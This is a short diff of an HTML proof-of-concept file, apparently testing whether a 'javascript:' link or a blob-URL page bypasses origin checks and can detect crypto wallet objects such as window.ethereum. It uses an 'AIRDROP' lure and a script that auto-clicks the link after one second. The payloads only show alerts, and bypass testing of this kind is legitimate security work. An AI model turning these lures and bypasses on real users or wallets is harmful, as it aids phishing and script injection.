@@ -1,12 +1,6 @@
+<!-- file: js-bypass.html -->
+<a href="javascript:alert(document.domain)">CLICK ME FOR AIRDROP</a>
 <script>
-// Simpan sebagai blob-bypass.html
-let html = `
-<script>
-alert("origin: "+location.origin);
-alert("freighter: "+!!window.freighterApi);
-alert("ethereum: "+!!window.ethereum);
-<\/script>
-`;
-let blob = new Blob([html], {type:"text/html"});
-location.href = URL.createObjectURL(blob);
+// Auto-click setelah 1 detik
+setTimeout(()=>{ document.querySelector('a').click() }, 1000);
 </script>
